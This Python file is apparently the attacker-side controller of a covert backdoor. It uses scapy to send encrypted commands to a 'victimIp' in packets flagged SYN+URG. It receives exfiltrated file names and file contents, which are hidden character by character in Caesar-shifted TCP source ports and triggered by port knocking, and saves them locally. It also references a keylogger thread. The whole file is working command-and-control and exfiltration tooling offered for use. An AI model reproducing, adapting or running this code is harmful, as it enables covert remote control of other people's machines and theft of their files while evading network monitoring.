import os
import threading
import time
import configparser

import casear   #casear.py casear cipher encryption

from cryptography.fernet import Fernet #fernet encryption
from scapy.all import *

config = configparser.ConfigParser()
config.sections()
config.read("config.txt")

keyname = config['Encryption']['FernetKey']
shift = int(config['Encryption']['CasearShift']) #50 #shift for casear cipher

victimIp = config['Target']['victimIp'] #"192.168.1.250"

commandPort = int(config['Ports']['commandPort']) #500

fileNamePort = int(config['Ports']['fileNamePort']) #999
fileDataPort = int(config['Ports']['fileDataPort']) #1000
sniffEndPort = int(config['Ports']['sniffEndPort']) #1005

#watchDstIP = "192.168.1.253"
watchFileNamePort = int(config['Ports']['watchFileNamePort']) #1999
watchFileDataPort = int(config['Ports']['watchFileDataPort']) #2000
watchSniffEndPort = int(config['Ports']['watchSniffEndPort']) #2005

synurg = "tcp[tcpflags] == 34" #34 is also 0x22
commandListenFilter = "src " + victimIp + " and tcp port " + str(commandPort) + " and " + synurg

nameFilterExpr = "src " + victimIp + " and tcp port (" + str(fileNamePort) + " or " + str(sniffEndPort) + ") and " + synurg
dataFilterExpr = "src " + victimIp + " and tcp port (" + str(fileDataPort) + " or " + str(sniffEndPort) + ") and " + synurg
#nameFilterExpr = "src " + victimIp + " and tcp port (999 or 1005) and " + synurg
#dataFilterExpr = "src " + victimIp + " and tcp port (1000 or 1005) and " + synurg

watchNameFilterExpr = "src " + victimIp + " and tcp port (" + str(watchFileNamePort) + " or " + str(watchSniffEndPort) + ") and " + synurg
watchDataFilterExpr = "src " + victimIp + " and tcp port (" + str(watchFileDataPort) + " or " + str(watchSniffEndPort) + ") and " + synurg
#watchNameFilterExpr = "src " + victimIp + " and tcp port (1999 or 2005) and " + synurg
#watchDataFilterExpr = "src " + victimIp + " and tcp port (2000 or 2005) and " + synurg

#key for fernet encryption
with open(keyname, 'r') as filekey:
    readkey = filekey.read()
f = Fernet(readkey)




#port knocking exfil command receiver
#------------------------------------------------------------------------------
Wgotname = False
Wfilename = ""

def Wgetfilename(packet): #get filename on dport 999 packets
    global Wfilename
    global Wgotname
    #decrypt payload with fernet to authenticate
    valid = True

    if(packet[IP].dport == watchFileNamePort and packet.seq == 0 and valid):
        #decrypt casear and add to filename
        #decoded = casear.decrypt(chr(packet.urgptr), shift)
        decoded = casear.decrypt(chr(packet.sport), shift)
        Wfilename += decoded
        Wgotname = True

#filter to stop sniffing for name
def WstopfilterName(packet): #stop sniffing after receiving port 1005 with syn 0
    global Wgotname
    global Wfilename
    #decrypt payload with fernet to authenticate
    valid = True

    if (packet[IP].dport == watchSniffEndPort and packet.seq == 0 and Wgotname and valid):
        Wfilename = Wfilename.split('/')[-1]
        print("Received stop name signal")
        print("Filename is: " + Wfilename)
        #make the file
        file=open(Wfilename, "w")
        file.close()
        return True
    else:
        return False
        
#reaads packet data
def WreadData(packet):#recieve data on dport 1000
    global Wfilename
    #decrypt payload with fernet to authenticate
    valid = True
  
    #print(valid)
    #print(packet.load)
    #packet.show()
    if(packet[IP].dport == watchFileDataPort and packet.seq == 0 and valid):
        #decrypt casear cipher on urgptr
        
        #decoded = casear.decrypt(chr(packet.urgptr), shift)
        decoded = casear.decrypt(chr(packet.sport), shift)
        print(decoded, end="")
        file=open(Wfilename, "a") #append
        file.write(decoded)
        file.close()        
        
def WstopfilterData(packet):
    #decrypt payload with fernet to authenticate
    valid = True

    if(packet[IP].dport == watchSniffEndPort and packet.seq == 1 and valid):
        #clear the values
        print("")
        Wfilename = ""
        Wgotname = False
        return True
    else:
        return False

def WexfilThread():
    print("Started WatchExfiltrateThread")
    global Wfilename
    while True:
        print("Waiting for WatchExfiltrate knock")
        Wfilename = ""
        a=sniff(filter=watchNameFilterExpr, prn=Wgetfilename, stop_filter=WstopfilterName)
        print("WatchWaiting for data")
        a=sniff(filter=watchDataFilterExpr, prn=WreadData, stop_filter=WstopfilterData)
        print("Completed saving saving Watch exfiltrated file")
#------------------------------------------------------------------------------

#port knocking exfil command receiver
#------------------------------------------------------------------------------
gotname = False
filename = ""

def getfilename(packet): #get filename on dport 999 packets
    global filename
    global gotname
    #decrypt payload with fernet to authenticate
    valid = True

    if(packet[IP].dport == fileNamePort and packet.seq == 0 and valid):
        #decrypt casear and add to filename
        #decoded = casear.decrypt(chr(packet.urgptr), shift)
        decoded = casear.decrypt(chr(packet.sport), shift)
        filename += decoded
        gotname = True
        

#filter to stop sniffing for name
def stopfilterName(packet): #stop sniffing after receiving port 1005 with syn 0
    global gotname
    global filename
    #decrypt payload with fernet to authenticate
    valid = True

    if (packet[IP].dport == sniffEndPort and packet.seq == 0 and gotname and valid):
        filename = filename.split('/')[-1]
        print("Received stop name signal")
        print("Filename is: " + filename)
        #make the file
        file=open(filename, "w")
        file.close()
        return True
    else:
        return False
        
#reaads packet data
def readData(packet):#recieve data on dport 1000
    global filename
    #decrypt payload with fernet to authenticate
    valid = True
    #packet.show()
    if(packet[IP].dport == fileDataPort and packet.seq == 0 and valid):
        #decrypt casear cipher on urgptr
        #decoded = casear.decrypt(chr(packet.urgptr), shift)
        decoded = casear.decrypt(chr(packet.sport), shift)
        print(decoded, end="")
        file=open(filename, "a") #append
        file.write(decoded)
        file.close()        
        
def stopfilterData(packet):
    #decrypt payload with fernet to authenticate
    valid = True
    
    if(packet[IP].dport == sniffEndPort and packet.seq == 1 and valid):
        #clear the values
        print("")
        filename = ""
        gotname = False
        return True
    else:
        return False

def exfilThread():
    print("Started ExfiltrateThread")
    global filename
    while True:
        print("Waiting for exfiltrate knock")
        filename = ""
        a=sniff(filter=nameFilterExpr, prn=getfilename, stop_filter=stopfilterName)
        print("Waiting for data")
        a=sniff(filter=dataFilterExpr, prn=readData, stop_filter=stopfilterData)
        print("Completed saving saving exfiltrated file")
#------------------------------------------------------------------------------

#dport 500 of attacker with SYNURG and sequenceNum 0
def readPacket(packet):
    #check for the fernet payload and try to decrypt, if it fails then its bad
    valid = True
    
    #print("got packet")
    if(packet.seq == 0 and valid):
        #use casear cipher decryption
        #encMsg = packet.urgptr
        encMsg = packet.sport
        caedecrypt = (casear.decrypt(chr(encMsg), shift))
        print(caedecrypt, end="")
            
def listenThread():
    print("Started CommandListener")
    aRec=sniff(filter=commandListenFilter, prn=readPacket)   

def keylogThread():
    print("Started Keylogger")
    logger.Keylogger.main()

def main():
    print("Starting backdoor program")
    lthread = threading.Thread(target=listenThread)
    lthread.setDaemon(True)
    lthread.start()
    
    ethread = threading.Thread(target=exfilThread)
    ethread.setDaemon(True)
    ethread.start()
    
    Wethread = threading.Thread(target=WexfilThread)
    Wethread.setDaemon(True)
    Wethread.start()
    
    #main remote controller thread
    #encrypted fernet to both hide command and as authentication 
    while(True):
        val = input("")
        if(len(val) > 0): #not empty string
            #fernet encrypted payload
            encrypted = f.encrypt(val.encode())
            tcp = TCP()
            tcp.sport = commandPort #port 500
            tcp.dport = commandPort #port 500
            tcp.flags = 0x22
            tcp.urgptr = 80
            Dgram = IP()/tcp
            Dgram.dst = victimIp
            Dgram.add_payload(encrypted)
            send(Dgram, verbose=False)
            time.sleep(0.25)  
        else:
            print("Input is empty")

    
    time.sleep(5)
    print("main Sleep over")
    
main()
